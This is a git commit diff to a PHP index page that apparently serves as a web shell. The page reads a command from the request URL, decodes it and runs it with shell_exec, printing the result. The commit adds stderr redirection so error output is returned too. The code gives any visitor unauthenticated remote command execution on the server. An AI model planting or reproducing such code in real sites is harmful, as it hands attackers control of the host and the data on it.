81adffc0b024947ffdcb3aa40c379897fbcc52c2
laiyuantemp <100673133+laiyuantemp@users.noreply.github.com>
2022-08-16 14:18:47 +0800

    Update index.php

--- index.php
+++ index.php
@@ -7,7 +7,7 @@
   $cmd = substr($_SERVER['REQUEST_URI'], strpos($_SERVER['REQUEST_URI'], "=", 1)+1);
   $cmd = urldecode($cmd);
   $cmd = $cmd === "" ? "echo hello" : $cmd;
-  echo shell_exec($cmd);
+  echo shell_exec($cmd." 2>&1");
 ?>
 </pre>
 <br>
